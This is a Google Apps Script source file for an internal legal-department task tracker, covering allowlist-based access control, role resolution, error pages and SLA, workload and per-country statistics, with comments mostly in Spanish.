// ════════════════════════════════════════════════════════════════
// Legal Team Tracker · Google Apps Script · Web App
// RappiPlus · Global Legal · v3.6 (Collaboration & Polish)
// ════════════════════════════════════════════════════════════════

const SHEET_ID        = '19eR-pXzVLTSEdCADeBZ8fsd5x4f2t0GowUJiJm2X6ms';
const SHEET_ACTIVO    = 'Tracking Activo';
const SHEET_HISTORIAL = 'Historial';
const SHEET_CONFIG    = 'Config';
const SHEET_EQUIPOS   = 'Equipos';
const SHEET_PROYECTOS = 'Proyectos';
const SHEET_COMMENTS  = 'Comments'; // Auto-created on first use; cols: id, task_id, author_email, author_name, ts, body
const SHEET_ACTIVITY  = 'Activity'; // Auto-created; cols: id, ts, task_id, author_email, author_name, action, field, old_value, new_value
const SHEET_FERIADOS  = 'Feriados'; // Manual; cols: pais (CO/MX/CR/...) | fecha (YYYY-MM-DD) | nombre
const SHEET_TEMPLATES = 'Templates'; // Optional; cols: tipoTrabajo | checklist(JSON) | estado | autor.
const SHEET_BIBLIO_DOCS = 'BibliotecaDocs'; // Optional; cols: id | nombre | tipo(link|file) | url | categoria | autor | fecha.
const SHEET_RECURSOS  = 'Recursos'; // Auto-created on first use (seeded); cols: id | titulo | url | categoria | descripcion | autor | autorEmail | fecha.
const SHEET_INTEGRACIONES = 'Integraciones'; // Auto-created on first use (seeded, 8 rows); cols (14): id|key|titulo_es|titulo_pt|queHace_es|queHace_pt|comoActivar_es|comoActivar_pt|estado|icono|ctaTexto_es|ctaTexto_pt|ctaUrl|orden.

// ── DAILY DIGEST ────────────────────────────────────────────────
// URL del web app deployado (/exec). Se usa en los emails del digest
// para construir deep-links como WEB_APP_URL + '?task=ID'.
// Si rotás el deployment (Deploy → Manage deployments → nuevo /exec),
// actualizá esta constante o los links del email apuntarán al
// deployment viejo. Validar contra Apps Script editor → Deploy.
const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyWIOIHZzUJ9yzk9nDYMm26FcEAVE6M-VisDHM8cqyA_ijnCG3YjeNIgVt2_MaJveYdCg/exec';
const DIGEST_TZ = 'America/Bogota';
const DIGEST_SKIP_WEEKENDS = true; // En sáb/dom el trigger corre pero hace early return.

// Tasks: 19 cols — ID,Nombre,Resp,Acc,Deadline,Prioridad,Estado,Semana,Creado,Cerrado,Notas,Proyecto(ID),País,Líder,TipoTrabajo,Riesgo,Documentos,Confidencialidad,Contraparte
// La columna 18 (Confidencialidad) puede no existir todavía en la hoja: getLastColumn() devolverá
// menos y el read defaultea a 'estandar'. Cuando el usuario agregue la columna manualmente,
// los nuevos updates se persisten ahí.
// NOTA MIGRACIÓN: las columnas TASK col 19 (Contraparte) y PROJ col 17 (ContrapartesConflicto)
// deben agregarse manualmente al sheet antes de usar; sin la columna se defaultean a vacío.
// TASK col 21 (Colaboradores, JSON [{name,role}]) se agrega con migrarColaboradores() (admin.gs);
// sin la columna readTasks defaultea a [] y setTaskColaboradores avisa que falta migrar.
const TASK_COLS = 22;
const TASK_DOCS_COL = 17; // 1-indexed
const TASK_CONF_COL = 18; // 1-indexed
const TASK_CONTRAPARTE_COL = 19; // 1-indexed
const TASK_AREASOL_COL = 20; // 1-indexed · "Área solicitante" (cliente interno)
const TASK_COLAB_COL = 21; // 1-indexed · Colaboradores (JSON [{name,role}], role ∈ {ver,editar})
const TASK_BLOCKED_COL = 22; // 1-indexed · BlockedSince (Date del último bloqueo; vacío si no está bloqueada). Requiere migrarBlockedSince().
// Projects: 17 cols — ID,Nombre,País,Líder,Responsable,Deadline,Prioridad,Estado,Descripción,Notas,Creado,Semana,Participantes,TipoTrabajo,Riesgo,Documentos,ContrapartesConflicto
const PROJ_COLS = 17;
const PROJ_DOCS_COL = 16; // 1-indexed
const PROJ_CONTRAPARTES_COL = 17; // 1-indexed

const STATUS_ORDER = {'Bloqueado':0,'En curso':1,'Pendiente':2,'En revisión':3,'Listo':4};
const PRIO_ORDER   = {'Alta':0,'Media':1,'Baja':2};
// Fuente unica de SLA (dias habiles por prioridad). Viaja al cliente en data.slaLimits.
const SLA_LIMITS   = {'Alta':2,'Media':5,'Baja':7};

// ── CACHE ───────────────────────────────────────────────────────
// Cacheamos el snapshot completo por 30s. Cualquier escritura llama a invalidateCache().
const CACHE_KEY = 'tracker_data_v1';
const CACHE_TTL_SEC = 30;
function invalidateCache() { try { CacheService.getScriptCache().remove(CACHE_KEY); } catch(e) {} }

// ── WEB APP ─────────────────────────────────────────────────────
// doGet valida que el visitante esté en la allowlist de la hoja Equipos antes de
// renderizar el dashboard. La allowlist combina leaderEmail + emails de cada equipo.
// Requisitos de deployment:
//   - Execute as: Me (owner)
//   - Who has access: Anyone within <dominio> (o Anyone with Google account)
// Así Session.getActiveUser().getEmail() retorna el email verificado del visitante.
function doGet(e) {
  var page = e && e.parameter && e.parameter.page;

  // Endpoint /api?page=api sigue abierto para scripts internos (cambia si necesitas
  // protegerlo también; típicamente se restringe con execute-as y acceso limitado).
  if (page === 'api') {
    return ContentService.createTextOutput(JSON.stringify(getTrackerData()))
      .setMimeType(ContentService.MimeType.JSON);
  }

  // 1) Autenticación: resolver el usuario visitante contra la allowlist
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var authResult = resolveVisitor(equipos);

  if (!authResult.ok) {
    return renderAccessDenied(authResult);
  }

  // 2) Determinar rol (head / manager / specialist) contra hoja Config
  var role = determineRole(authResult.email, authResult.user, config);

  // 3) Render normal, con el usuario ya resuelto y rol determinado.
  // getEditorialData() lee todo el Sheet; una sola celda mal tipeada (p.ej. una
  // fecha como texto) podía tirar acá y voltear la app para TODOS con la pantalla
  // genérica de Apps Script. La envolvemos para dar un error accionable.
  var data;
  try {
    data = getEditorialData();
  } catch (err) {
    Logger.log('doGet: getEditorialData() fallo: ' + ((err && err.stack) || err));
    return renderServerError(err);
  }
  var html = HtmlService.createTemplateFromFile('frontend/Dashboard');
  html.data = JSON.stringify(data);
  html.currentUser = JSON.stringify({
    email: authResult.email,
    name:  authResult.user.name,
    code:  authResult.user.code,
    isLeader: !!authResult.user.isLeader,
    role: role
  });
  // SECURITY: por default Apps Script setea X-Frame-Options=SAMEORIGIN, lo que
  // mitiga clickjacking. Antes estaba ALLOWALL (cualquiera podía iframearlo).
  // TODO: si el equipo necesita embeberlo en Notion/Confluence, agregar selectivamente
  // ALLOWALL aquí (asumiendo el riesgo de clickjacking documentado en code review).
  return html.evaluate()
    .setTitle('Legal Tracker · Rappi')
    .addMetaTag('viewport','width=device-width, initial-scale=1');
}

function include(f){ return HtmlService.createHtmlOutputFromFile(f).getContent(); }

// ── AUTH HELPERS ────────────────────────────────────────────────
// Arma un mapa (email lowercase) → {name, code, isLeader} a partir de la hoja Equipos.
// - leaderEmail se mapea a leader
// - emails[i] se asume paralelo a members[i] (mismo orden)
// - First-wins: si un email aparece en varios equipos (ej. Eduardo es leader
//   de CO y CR), se queda con el primero del Sheet. Sin esto, la última
//   iteración pisa el código de país y el manager queda en el equipo
//   equivocado. Multi-country real queda para Fase 2.
function buildEmailAllowlist(equipos) {
  var map = {};
  equipos.forEach(function(eq) {
    if (eq.leaderEmail) {
      var le = eq.leaderEmail.toString().toLowerCase().trim();
      if (le && !map[le]) {
        map[le] = { name: eq.leader, code: eq.code, isLeader: true };
      }
    }
    // Mapeo posicional members[i] ↔ emails[i]. Si los largos no coinciden (un email
    // omitido/desfasado en la hoja), NO adivinamos por posición: mapear mal le daría
    // a una persona la identidad —y las tareas, incluidas las confidenciales— de
    // otra. Fail-closed: salteamos el mapeo de miembros de ese equipo (el líder sí
    // se mapea arriba) y logueamos. La persona queda "sin acceso" (visible y
    // recuperable) en vez de entrar como otro (silencioso y peligroso).
    var members = eq.members || [];
    var emails  = eq.emails  || [];
    if (emails.length > 0 && emails.length !== members.length) {
      Logger.log('buildEmailAllowlist: equipo "' + eq.code + '" con desfase members(' +
        members.length + ') vs emails(' + emails.length + ') — se omite el mapeo posicional. Revisá la hoja Equipos.');
    } else {
      for (var i = 0; i < members.length; i++) {
        var email = emails[i];
        if (email) {
          var em = email.toString().toLowerCase().trim();
          if (em && !map[em]) {
            map[em] = { name: members[i], code: eq.code, isLeader: false };
          }
        }
      }
    }
  });
  return map;
}

// Valida la hoja Equipos para el alta de país. Devuelve {ok, errors[], warnings[]}.
// El check clave es la PARIDAD members↔emails: es el origen del riesgo de identidad
// cruzada (un email desfasado hace entrar a alguien con el nombre de otro). Pensado
// para correr en runPilotSmokeTest antes de invitar a un equipo nuevo.
function validateEquipos(equipos) {
  var errors = [], warnings = [];
  (equipos || []).forEach(function(eq) {
    var members = eq.members || [], emails = eq.emails || [];
    if (emails.length > 0 && emails.length !== members.length) {
      errors.push('Equipo "' + eq.code + '": ' + members.length + ' miembros pero ' +
        emails.length + ' emails. Deben ser paralelos (mismo orden, mismo largo).');
    }
    if (emails.length === 0 && members.length > 0) {
      warnings.push('Equipo "' + eq.code + '": ' + members.length +
        ' miembros sin emails (col F) — ninguno tendrá acceso ni recibirá digest.');
    }
  });
  return { ok: errors.length === 0, errors: errors, warnings: warnings };
}

// Retorna {ok:true, email, user} si el visitante tiene acceso; caso contrario
// {ok:false, reason, email} para mostrar el motivo en la página de denegado.
function resolveVisitor(equipos) {
  var email = '';
  try { email = (Session.getActiveUser().getEmail() || '').toLowerCase().trim(); } catch(e) {}
  if (!email) {
    return { ok: false, reason: 'no_session',
      message: 'No pudimos identificar tu cuenta. Asegúrate de estar logueado en Google con tu correo corporativo.' };
  }
  var allow = buildEmailAllowlist(equipos);
  var user = allow[email];
  if (!user) {
    return { ok: false, reason: 'not_allowlisted', email: email,
      message: 'Tu correo (' + email + ') no está registrado en el tracker. Pide a tu líder de equipo que lo agregue en la hoja "Equipos".' };
  }
  return { ok: true, email: email, user: user };
}

// Renderiza una página simple de "acceso denegado" con el mismo look del tracker.
function renderAccessDenied(authResult) {
  var safeMsg = (authResult.message || 'Acceso denegado').replace(/</g, '&lt;');
  var deniedEmail = (authResult.email || '').toString().replace(/</g, '&lt;');
  var body = ''
    + '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">'
    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>Legal Tracker · Sin acceso</title>'
    + '<style>'
    +   'body{background:#0C0E14;color:#F0F2F8;font-family:system-ui,sans-serif;'
    +        'margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
    +   '.box{max-width:480px;background:#151820;border:1px solid rgba(255,255,255,.08);'
    +        'border-radius:16px;padding:40px;text-align:center}'
    +   '.logo{width:56px;height:56px;border-radius:16px;background:#FF4940;display:flex;'
    +         'align-items:center;justify-content:center;font-size:26px;margin:0 auto 20px}'
    +   'h1{font-size:20px;font-weight:800;margin:0 0 12px}'
    +   'p{color:#9099B0;font-size:13px;line-height:1.55;margin:0 0 8px}'
    +   '.email{font-family:ui-monospace,monospace;color:#FFB938;word-break:break-all}'
    +   '.actions{display:flex;flex-direction:column;gap:8px;margin-top:24px}'
    +   '.btn{padding:10px 16px;border-radius:8px;font-size:13px;font-weight:500;'
    +        'cursor:pointer;border:0;display:inline-flex;align-items:center;justify-content:center;gap:6px;text-decoration:none}'
    +   '.btn-pri{background:#FF4940;color:#fff}'
    +   '.btn-sec{background:transparent;color:#F0F2F8;border:1px solid rgba(255,255,255,.15)}'
    +   '.hint{margin-top:18px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06);'
    +         'font-size:12px;color:#6a6a72;line-height:1.55}'
    +   '.hint a{color:#FFB938;text-decoration:none}'
    + '</style></head><body>'
    + '<div class="box">'
    +   '<div class="logo">🔒</div>'
    +   '<h1>Sin acceso al Legal Tracker</h1>'
    +   '<p>' + safeMsg + '</p>'
    +   (deniedEmail ? '<p>Entraste como <span class="email">' + deniedEmail + '</span></p>' : '')
    +   '<div class="actions">'
    +     '<a class="btn btn-pri" href="javascript:location.reload()">Reintentar</a>'
    +     '<a class="btn btn-sec" href="https://accounts.google.com/AccountChooser" target="_blank">Cambiar cuenta de Google</a>'
    +   '</div>'
    +   '<div class="hint">¿Crees que es un error? Pedile a tu líder de equipo legal que verifique '
    +     'la hoja <b>Equipos</b> del spreadsheet, o escribile a soporte interno.</div>'
    + '</div></body></html>';
  return HtmlService.createHtmlOutput(body)
    .setTitle('Legal Tracker · Sin acceso')
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

// Página de error accionable cuando la carga de datos falla (típicamente una celda
// mal tipeada en el Sheet). Evita la pantalla genérica de Apps Script y le dice al
// equipo qué revisar. El detalle del error se escapa antes de interpolar.
function renderServerError(err) {
  var detail = ((err && err.message) || err || 'Error desconocido').toString().replace(/</g, '&lt;');
  var body = ''
    + '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">'
    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>Legal Tracker · Error</title>'
    + '<style>'
    +   'body{background:#0C0E14;color:#F0F2F8;font-family:system-ui,sans-serif;'
    +        'margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
    +   '.box{max-width:520px;background:#151820;border:1px solid rgba(255,255,255,.08);'
    +        'border-radius:16px;padding:40px;text-align:center}'
    +   '.logo{width:56px;height:56px;border-radius:16px;background:#FFB938;display:flex;'
    +         'align-items:center;justify-content:center;font-size:26px;margin:0 auto 20px}'
    +   'h1{font-size:20px;font-weight:800;margin:0 0 12px}'
    +   'p{color:#9099B0;font-size:13px;line-height:1.55;margin:0 0 8px}'
    +   '.detail{font-family:ui-monospace,monospace;color:#FFB938;font-size:12px;word-break:break-word;'
    +           'background:rgba(0,0,0,.25);padding:10px 12px;border-radius:8px;margin-top:8px}'
    +   '.actions{margin-top:24px}'
    +   '.btn{padding:10px 16px;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;'
    +        'border:0;background:#FF4940;color:#fff;text-decoration:none;display:inline-block}'
    +   '.hint{margin-top:18px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06);'
    +         'font-size:12px;color:#6a6a72;line-height:1.55}'
    + '</style></head><body>'
    + '<div class="box">'
    +   '<div class="logo">⚠️</div>'
    +   '<h1>No pudimos cargar el tracker</h1>'
    +   '<p>Hubo un problema al leer los datos. Suele deberse a una celda con formato '
    +     'inesperado en la hoja (por ejemplo, una fecha escrita como texto).</p>'
    +   '<div class="detail">' + detail + '</div>'
    +   '<div class="actions"><a class="btn" href="javascript:location.reload()">Reintentar</a></div>'
    +   '<div class="hint">Si persiste, avisale al admin del tracker: revisá las columnas de fecha '
    +     '(<b>Creado</b>, <b>Cerrado</b>, <b>Plazo</b>) en <b>Tracking Activo</b> e <b>Historial</b>; '
    +     'una celda en texto en vez de fecha es la causa más común.</div>'
    + '</div></body></html>';
  return HtmlService.createHtmlOutput(body).setTitle('Legal Tracker · Error');
}

// ════════════════════════════════════════════════════════════════
// GET ALL DATA
// ════════════════════════════════════════════════════════════════
// Entry point que resuelve al visitante, determina su rol y devuelve la data
// filtrada según lo que debe ver. Delega reads caros a _buildRawData()
// (cacheado) y calcula stats en memoria sobre el subset visible.
function getTrackerData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  var raw = _cachedRawData();
  var feriadosByCountry = _loadFeriados(ss); // 1h cache; usado en SLA biz days
  return _buildViewForRole(raw, role, auth.user, feriadosByCountry);
}

// ════════════════════════════════════════════════════════════════
// EDITORIAL DATA (extiende getTrackerData con campos derivados)
// ════════════════════════════════════════════════════════════════
// Wrapper sobre getTrackerData() que enriquece tareas, miembros del equipo
// y países con campos derivados que la nueva UI editorial consume.
// Reusa la cache de 30s vía getTrackerData(); los cálculos extra son baratos.
// NO modifica el shape original — sólo agrega campos.
function getEditorialData() {
  return _telemetry('getEditorialData', _getEditorialDataImpl);
}

// Capacidad de tareas por persona, usada para las load bars y el ranking de
// "quién necesita atención". Se lee de la hoja Config (key→value):
//   - "Capacidad default"      → número base para todo el equipo (fallback 5).
//   - "Capacidad: <Nombre>"    → override individual (insensible a acentos/caso).
// Si Config no existe o un valor es inválido (no numérico o <= 0), cae al default.
function _resolveCapacityMap(config) {
  var DEFAULT = 5;
  var out = { def: DEFAULT, byName: {} };
  if (!config) return out;
  var parsedDefault = parseInt(config['Capacidad default'], 10);
  if (!isNaN(parsedDefault) && parsedDefault > 0) out.def = parsedDefault;
  Object.keys(config).forEach(function(k) {
    var m = /^Capacidad:\s*(.+)$/.exec(k);
    if (!m) return;
    var n = parseInt(config[k], 10);
    if (isNaN(n) || n <= 0) return;
    out.byName[_normalizeName(m[1])] = n;
  });
  return out;
}

function _getEditorialDataImpl() {
  var data = getTrackerData();
  var today = Utilities.formatDate(new Date(), 'America/Bogota', 'yyyy-MM-dd');

  // Cargamos feriados una vez por request — usados para etaDays (biz days) y
  // para los promedios/streak históricos (bizDays sin contar feriados del país).
  // Si la hoja Feriados no existe o está vacía, fbc = {} y el código cae en
  // fallback "solo lun-vie sin feriados" — backwards-compat total.
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var fbc = _loadFeriados(ss);

  // Enriquecer tareas activas + historial (con feriados → etaDays en biz days)
  if (data.tasks && data.tasks.length) {
    data.tasks.forEach(function(t) { _enrichTaskEditorial(t, today, { feriadosByCountry: fbc }); });
  }
  if (data.historial && data.historial.length) {
    data.historial.forEach(function(t) { _enrichTaskEditorial(t, today, { feriadosByCountry: fbc }); });
  }

  // Enriquecer miembros del team (load, capacity, overdue, blocked, streak, avgs)
  // Optimización: pre-buckear tasks/historial por resp en una pasada,
  // sino para cada miembro hacíamos un .filter() sobre el array completo
  // (O(team × n)). Ahora es O(n + team).
  if (data.team && data.team.length) {
    var tasksByResp = {};
    // Buckets de tareas donde el miembro es colaborador con rol 'editar' (cuentan
    // para load, igual que si fuera resp). Las colaboraciones 'ver' NO suman carga.
    // Keyeado por nombre normalizado porque el name del colaborador puede diferir
    // en mayúsculas/acentos del member.name.
    var tasksByColabEditor = {};
    (data.tasks || []).forEach(function(t) {
      var key = t.resp || '';
      (tasksByResp[key] = tasksByResp[key] || []).push(t);
      var colabs = t.colaboradores || [];
      for (var ci = 0; ci < colabs.length; ci++) {
        if (colabs[ci] && colabs[ci].role === 'editar') {
          var ckey = _normalizeName(colabs[ci].name);
          if (!ckey) continue;
          (tasksByColabEditor[ckey] = tasksByColabEditor[ckey] || []).push(t);
        }
      }
    });
    var histByResp = {};
    (data.historial || []).forEach(function(t) {
      if (!t.resp || !t.creadoRaw || !t.cerrado) return;
      var p = t.cerrado.split('/');
      var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
      var ferSet = fbc[(t.pais || 'CO').toUpperCase()] || null;
      var entry = {
        priority: t.priority,
        bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate, ferSet),
        cerradoDate: cerradoDate
      };
      (histByResp[t.resp] = histByResp[t.resp] || []).push(entry);
    });

    var nowMsMember = new Date().getTime();
    var THIRTY_DAYS_MS_M = 30 * 24 * 60 * 60 * 1000;
    var capMap = _resolveCapacityMap(data.config);

    // Mapa code(upper) → nombre normalizado del LÍDER del país. Fuente: data.countries[].leader
    // (no recortado por PII, a diferencia de data.equipos que para spec/manager se filtra a su
    // propio país). El líder de un país NO es un specialist; el frontend usa member.isLead para
    // no contarlo ni etiquetarlo como tal. Si no hay líder conocido → no entra al mapa → isLead=false.
    var leaderByCode = {};
    (data.countries || []).forEach(function(c) {
      if (!c || !c.code) return;
      var ln = _normalizeName(c.leader);
      if (ln) leaderByCode[c.code.toUpperCase()] = ln;
    });

    data.team.forEach(function(member) {
      // isLead: true sii este miembro es el líder de SU país (match por nombre normalizado).
      // Degradación segura: sin country o sin líder conocido → false. Campo nuevo y aditivo:
      // no toca member.role, así que lecturas viejas (sin isLead) siguen funcionando.
      var memCode = (member.country || '').toUpperCase();
      var leadNorm = leaderByCode[memCode];
      member.isLead = !!(leadNorm && _normalizeName(member.name) === leadNorm);
      // Tareas del miembro: como resp + como colaborador-editar. Dedup por id
      // (un mismo task no debe contar doble; el CRUD impide ser resp y colab a la vez,
      // pero deduplicamos por las dudas ante data inconsistente).
      var memberTasks = (tasksByResp[member.name] || []).slice();
      var colabEditorTasks = tasksByColabEditor[_normalizeName(member.name)] || [];
      if (colabEditorTasks.length) {
        var seen = {};
        memberTasks.forEach(function(t){ seen[t.id] = 1; });
        colabEditorTasks.forEach(function(t){ if (!seen[t.id]) { seen[t.id] = 1; memberTasks.push(t); } });
      }
      // active = tareas (resp OR colaborador-editar) que no están cerradas/canceladas.
      var activeTasks = memberTasks.filter(function(t){ return t.status !== 'Listo' && t.status !== 'Cancelado'; });
      member.load     = activeTasks.length;
      var capByName   = capMap.byName[_normalizeName(member.name)];
      member.capacity = capByName || capMap.def;
      member.capacityEstimated = !capByName; // true = usa el default (no hay Capacidad: <nombre> en Config)
      // "Vencida" = tarde Y accionable. Una bloqueada no se puede cerrar hoy
      // (espera algo externo) → cuenta en member.blocked, no en overdue.
      member.overdue  = activeTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0 && t.status !== 'Bloqueado'; }).length;
      member.blocked  = activeTasks.filter(function(t){ return t.status === 'Bloqueado'; }).length;

      var memberHist = histByResp[member.name] || [];

      // SLA mes: % de cierres on-time en últimos 30 días. null si no hay cierres recientes
      // (la UI muestra "—" en ese caso). Usado en Home Manager y columna SLA de Mi Equipo.
      var recent30 = memberHist.filter(function(h){ return (nowMsMember - h.cerradoDate.getTime()) <= THIRTY_DAYS_MS_M; });
      if (recent30.length > 0) {
        var onTime30 = recent30.filter(function(h){ var sla = SLA_LIMITS[h.priority] || 5; return h.bizDays <= sla; }).length;
        member.slaPct = Math.round((onTime30 / recent30.length) * 100);
      } else {
        member.slaPct = null;
      }

      // streak: tareas cerradas a tiempo consecutivamente (más reciente → antigua).
      var streak = 0;
      var sortedDesc = memberHist.slice().sort(function(a, b){ return b.cerradoDate - a.cerradoDate; });
      for (var i = 0; i < sortedDesc.length; i++) {
        var sla = SLA_LIMITS[sortedDesc[i].priority] || 5;
        if (sortedDesc[i].bizDays <= sla) streak++;
        else break;
      }
      member.streak = streak;

      // Promedios por prioridad. "—" si no hay; entero → "3d", decimal → "1.5d".
      function avgFor(prio) {
        var arr = memberHist.filter(function(h){ return h.priority === prio; });
        if (!arr.length) return '—';
        var sum = arr.reduce(function(s, h){ return s + h.bizDays; }, 0);
        var avg = sum / arr.length;
        return (avg === Math.floor(avg) ? avg.toString() : avg.toFixed(1)) + 'd';
      }
      member.avgAlta  = avgFor('Alta');
      member.avgMedia = avgFor('Media');
      member.avgBaja  = avgFor('Baja');
    });
  }

  // Enriquecer countries (open, overdue, slaPct, trend)
  if (data.countries && data.countries.length) {
    var nowMs = new Date().getTime();
    var THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    var WEEK_MS = 7 * 24 * 60 * 60 * 1000;

    // Pre-buckear por país en una sola pasada (mismo motivo que team).
    var tasksByPais = {};
    (data.tasks || []).forEach(function(t) {
      var k = t.pais || '';
      (tasksByPais[k] = tasksByPais[k] || []).push(t);
    });
    var histByPais = {};
    (data.historial || []).forEach(function(t) {
      if (!t.pais || !t.creadoRaw || !t.cerrado) return;
      var p = t.cerrado.split('/');
      var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
      var ferSet = fbc[(t.pais || '').toUpperCase()] || null;
      (histByPais[t.pais] = histByPais[t.pais] || []).push({
        priority: t.priority,
        cerradoMs: cerradoDate.getTime(),
        bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate, ferSet)
      });
    });

    data.countries.forEach(function(c) {
      var countryTasks = tasksByPais[c.code] || [];
      // Cancelado se excluye igual que en member.* (activeTasks) y en el cliente
      // (_isOverdueTask): una Cancelada queda en Tracking Activo (solo Listo migra a
      // Historial), así que sin este filtro inflaba "abiertas"/"vencidas" del país y
      // de LATAM, divergiendo del tracker y de las stats por persona.
      c.open     = countryTasks.filter(function(t){ return t.status !== 'Listo' && t.status !== 'Cancelado'; }).length;
      // Vencida = tarde y accionable: las bloqueadas (On hold) no cuentan acá.
      c.overdue  = countryTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0 && t.status !== 'Listo' && t.status !== 'Bloqueado' && t.status !== 'Cancelado'; }).length;
      c.dueToday = countryTasks.filter(function(t){ return t.etaDays === 0 && t.status !== 'Listo' && t.status !== 'Bloqueado' && t.status !== 'Cancelado'; }).length;
      var countryHist = histByPais[c.code] || [];

      // slaPct: % de cierres dentro de SLA en los últimos 30 días.
      // Sin historial reciente → null (no penalizar países sin cierres).
      var recent = countryHist.filter(function(h){ return (nowMs - h.cerradoMs) <= THIRTY_DAYS_MS; });
      if (recent.length === 0) {
        c.slaPct = null;
      } else {
        var onTime = 0;
        recent.forEach(function(h) {
          var sla = SLA_LIMITS[h.priority] || 5;
          if (h.bizDays <= sla) onTime++;
        });
        c.slaPct = Math.round((onTime / recent.length) * 100);
      }

      // SLA semana actual vs semana anterior — habilita insights tipo
      // "MX cayó debajo del 90% por primera vez". null si <3 cierres.
      var thisWeek = countryHist.filter(function(h){ return (nowMs - h.cerradoMs) <= WEEK_MS; });
      var lastWeek = countryHist.filter(function(h){
        var age = nowMs - h.cerradoMs;
        return age > WEEK_MS && age <= 2 * WEEK_MS;
      });
      c.slaPctThisWeek = _slaPctOf(thisWeek, SLA_LIMITS);
      c.slaPctLastWeek = _slaPctOf(lastWeek, SLA_LIMITS);
      c.closedThisWeek = thisWeek.length;
      c.closedLastWeek = lastWeek.length;

      // trend: 12 buckets semanales, índice 11 = semana actual.
      // Proxy autorizado: cerradas por semana (throughput) en lugar de
      // tareas activas en stock. Lectura visual = velocidad de cierre.
      var trend = [0,0,0,0,0,0,0,0,0,0,0,0];
      countryHist.forEach(function(h) {
        var weeksAgo = Math.floor((nowMs - h.cerradoMs) / WEEK_MS);
        if (weeksAgo >= 0 && weeksAgo < 12) {
          trend[11 - weeksAgo]++;
        }
      });
      c.trend = trend;
    });

    // Agregados LATAM-wide para el HQ home.
    var latam = data.latam = {};
    latam.totalOpen     = data.countries.reduce(function(a,c){ return a + (c.open || 0); }, 0);
    latam.totalOverdue  = data.countries.reduce(function(a,c){ return a + (c.overdue || 0); }, 0);
    latam.totalDueToday = data.countries.reduce(function(a,c){ return a + (c.dueToday || 0); }, 0);
    latam.closedThisWeek = data.countries.reduce(function(a,c){ return a + (c.closedThisWeek || 0); }, 0);
    latam.closedLastWeek = data.countries.reduce(function(a,c){ return a + (c.closedLastWeek || 0); }, 0);
    // SLA agregado: promedio ponderado por cantidad de cierres recientes.
    var allRecent = [];
    Object.keys(histByPais).forEach(function(cc){
      (histByPais[cc] || []).forEach(function(h){
        if ((nowMs - h.cerradoMs) <= THIRTY_DAYS_MS) allRecent.push(h);
      });
    });
    latam.slaPct = allRecent.length ? _slaPctOf(allRecent, SLA_LIMITS) : null;
    // SLA esta semana vs semana anterior para LATAM completo.
    var latamThis = allRecent.filter(function(h){ return (nowMs - h.cerradoMs) <= WEEK_MS; });
    var latamPrev = allRecent.filter(function(h){
      var age = nowMs - h.cerradoMs;
      return age > WEEK_MS && age <= 2 * WEEK_MS;
    });
    latam.slaPctThisWeek = _slaPctOf(latamThis, SLA_LIMITS);
    latam.slaPctLastWeek = _slaPctOf(latamPrev, SLA_LIMITS);
  }

  // Globales
  data.today = today;
  data.templatesPending = _countPendingTemplates(ss);
  data.roleSpecific = data.roleSpecific || {};
  data.roleSpecific.narrative = _buildNarrative(data);

  data.slaLimits = SLA_LIMITS;
  return data;
}

// Cuenta plantillas con estado 'pendiente' (propuestas esperando aprobación).
// Se expone en el payload para el badge del menú Biblioteca, sin tener que
// abrir la vista. Defensivo: cualquier error → 0 (el badge simplemente no sale).
function _countPendingTemplates(ss) {
  try {
    var ws = ss.getSheetByName(SHEET_TEMPLATES);
    if (!ws) return 0;
    var lr = ws.getLastRow();
    if (lr < 2) return 0;
    var col = ws.getRange(2, 3, lr - 1, 1).getValues(); // columna 'estado'
    var n = 0;
    for (var i = 0; i < col.length; i++) {
      if ((col[i][0] || '').toString().trim().toLowerCase() === 'pendiente') n++;
    }
    return n;
  } catch (e) { return 0; }
}

// Helper: % de cierres dentro de SLA dado un array de histos. null si vacío.
function _slaPctOf(histArr, slaByPrio) {
  if (!histArr || histArr.length === 0) return null;
  var onTime = 0;
  for (var i = 0; i < histArr.length; i++) {
    var h = histArr[i];
    var sla = slaByPrio[h.priority] || 5;
    if (h.bizDays <= sla) onTime++;
  }
  return Math.round((onTime / histArr.length) * 100);
}

// Calcula y agrega los campos derivados a una tarea: eta, etaDays,
// accionable, blockedReason, slaTarget. Mutación in-place.
// opts.feriadosByCountry (opcional): si presente, etaDays se calcula en días
// hábiles (lun-vie excluyendo feriados del país de la tarea). Si ausente,
// fallback a calendario (comportamiento histórico).
function _enrichTaskEditorial(t, todayISO, opts) {
  opts = opts || {};
  var fbc = opts.feriadosByCountry;
  // etaDays + eta humano
  if (t.deadlineISO) {
    var diff;
    if (fbc) {
      // Si la tarea no tiene país, fallback a CO (equipo activo en pre-piloto)
      // dentro de _bizDaysBetween — si CO tampoco está cargado, queda en solo lun-vie.
      diff = _bizDaysBetween(todayISO, t.deadlineISO, (t.pais || 'CO').toUpperCase(), fbc);
    } else {
      diff = _daysBetweenISO(todayISO, t.deadlineISO);
    }
    t.etaDays = diff;
    t.eta = _fmtEta(diff);
  } else {
    t.etaDays = null;
    t.eta = '';
  }

  // accionable: primera línea de notas, o derivado del estado
